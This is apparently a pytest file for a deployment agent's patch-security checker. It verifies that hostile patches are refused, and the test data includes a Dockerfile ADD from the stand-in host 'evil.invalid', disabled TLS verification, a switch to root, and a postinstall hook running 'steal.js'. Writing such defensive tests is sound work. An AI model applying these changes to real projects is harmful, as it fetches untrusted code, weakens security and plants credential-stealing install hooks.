"""Adversarial changes are refused before any working-copy mutation."""

import json
from unittest.mock import Mock

import pytest

from application.agent import DeploymentTools
from application.patch_security import check_patch_security


@pytest.mark.parametrize(
    "path,before,after",
    [
        ("Dockerfile", "FROM python:3.13\nUSER 65534\n", "FROM python:3.13\nUSER root\n"),
        ("Dockerfile", "FROM python:3.13\nUSER 65534\n", "FROM python:3.13\n"),
        ("Dockerfile", "FROM python:3.13\n", "FROM python:3.13\nADD https://evil.invalid/a /a\n"),
        ("server.js", "const tls={};", "const tls={rejectUnauthorized:false};"),
        ("server.py", "requests.get(url)", "requests.get(url, verify=False)"),
        ("config.py", "mode='verify-full'", "sslmode='disable'"),
    ],
)
def test_known_security_downgrades_are_rejected(path, before, after):
    with pytest.raises(ValueError, match="Security policy"):
        check_patch_security(path, before, after)


def test_node_lifecycle_hook_patch_does_not_change_source_or_checkpoint(tmp_path):
    original = tmp_path / "original"
    original.mkdir()
    old = json.dumps({"scripts": {"start": "node server.js"}})
    new = json.dumps({"scripts": {"start": "node server.js", "postinstall": "node steal.js"}})
    (original / "package.json").write_text(old)
    checkpoint = Mock()
    tools = DeploymentTools(
        original, tmp_path / "work", "a" * 16, {}, Mock(), checkpoint, adapter_factory=Mock()
    )
    tools.read_project_files(["package.json"])
    with pytest.raises(ValueError, match="hook"):
        tools.apply_project_patch("package.json", old, new)
    assert (tools.work / "package.json").read_text() == old
    checkpoint.assert_not_called()


def test_supported_port_and_startup_repair_remains_allowed():
    check_patch_security("server.py", "app.run(host='127.0.0.1')", "app.run(host='0.0.0.0')")
    check_patch_security("package.json", '{"scripts":{}}', '{"scripts":{"start":"node server.js"}}')
